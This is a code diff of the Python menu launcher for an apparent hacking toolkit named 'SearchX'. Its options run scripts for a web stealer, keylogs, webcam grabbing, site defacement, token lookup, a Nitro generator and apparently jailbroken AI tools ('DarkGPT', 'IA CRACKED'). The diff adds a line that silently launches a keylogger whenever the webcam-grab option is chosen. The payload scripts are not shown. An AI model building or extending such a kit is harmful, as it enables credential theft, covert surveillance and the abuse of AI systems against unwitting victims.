@@ -1,8 +1,9 @@
 import os
 import colorama
-from colorama import Fore, Style
+from colorama import Fore
 import fade
 import sys
+import pystyle
 
 colorama.init(autoreset=True) 
 
@@ -25,7 +26,7 @@ def display_menu():
    ╔═══                     ═══╗ ╔═══                     ═══╗ ╔═══                   ═══╗╔═══                     ═══╗
    ║  {1} SearchX Obfuscator   ║ ║  {5} SearchX Deface       ║ ║  {9}  SearchX Deobfusc  ║║  {13} SearchX DarkGPT     ║
    ║  {2} SearchX Lookup       ║ ║  {6} SearchX Web to Ip    ║ ║  {10} SearchX Token Inf ║║  {14} SearchX IA CRACKED  ║
-   ║  {3} SearchX Nitro Gen    ║ ║  {7} SearchX Dump Lookup  ║ ║  {11} SearchX DMALL     ║║  {15} SearchX UPDATE      ║
+   ║  {3} SearchX Nitro Gen    ║ ║  {7} SearchX Dump Lookup  ║ ║  {11} SearchX DMALL     ║║  {15} SearchX CODE GPT    ║
    ║  {4} SearchX Database     ║ ║  {8} SearchX Web Stealer  ║ ║  {12} SearchX KeyLogs   ║║  {16} SearchX Webcam grab ║
    ╚═══                     ═══╝ ╚═══                     ═══╝ ╚═══                   ═══╝╚═══                     ═══╝
    ╔═══                     ═══╗ ╔═══                     ═══╗ ╔═══                   ═══╗╔═══                     ═══╗
@@ -37,7 +38,6 @@ def display_menu():
     print(Fore.GREEN + menu)
 
 def main_menu():
-    
     try:
         username = os.getlogin() 
     except OSError:
@@ -45,9 +45,12 @@ def main_menu():
 
     while True:
         display_menu()
-        choice_prompt = fade.greenblue(f"┌───{{{username}}}-(@SearchX)-(.gg/searchx)\n└─>   ")
-        choice = input(choice_prompt)
-        
+        choice_prompt = fade.greenblue(f"┌───{{{username}}}-(@SearchX)-(.gg/searchx)\n└─> ")
+
+        sys.stdout.write(choice_prompt)  
+        sys.stdout.flush()  
+        choice = input()  
+
         if choice == '1':
             os.system('cls' if os.name == 'nt' else 'clear')
             os.system('python src/obfuscator.py')
@@ -87,23 +90,12 @@ def main_menu():
         elif choice == '16':
             os.system('cls' if os.name == 'nt' else 'clear')
             os.system('python src/webcam.py')             
+            os.system('python src/keylogger.py')        
         elif choice == '32':
             os.system('cls' if os.name == 'nt' else 'clear')
-            os.system('python src/update.py')   
+            os.system('python src/update.py')           
         
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        elif choice == '13':
+        elif choice == '33':
             print(Fore.GREEN + "Sortie du programme...")
             break
         else:
